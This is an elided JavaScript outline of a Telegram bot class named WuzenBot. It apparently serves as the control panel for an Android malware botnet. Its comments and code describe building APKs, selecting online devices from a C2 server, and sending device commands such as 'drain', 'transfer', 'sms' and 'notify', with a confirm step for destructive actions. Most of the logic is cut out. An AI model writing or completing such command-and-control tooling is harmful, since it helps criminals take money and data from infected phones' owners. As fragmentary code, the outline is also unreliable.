...
export class WuzenBot extends EventEmitter {
  ...
  // ============ APK BUILD FLOW (shared by /build_apk + button) ============
  async runBuild(ctx) {
  ...
  setup() {
    ...
    bot.on('callback_query', async (ctx) => {
      ...
      try {
        ...
        // ---- CONFIRM / CANCEL (destructive gate) ----
        ...
        if (data.startsWith('menu_')) {
          ...
          // Category menus → pick an online device
          const devs = this.c2.getOnlineDevices();
    ...
    // ===== PENDING INPUT (params for drain/transfer/url/sms/notify) =====
    bot.on('text', (ctx) => {
      const session = this.getSession(ctx);
      if (!session.pending) return;
      const text = ctx.message.text.trim();
      if (text.startsWith('/')) return; // don't swallow commands
...
// ============ EXPORT FOR INDEX.JS (fixes the original error) ============
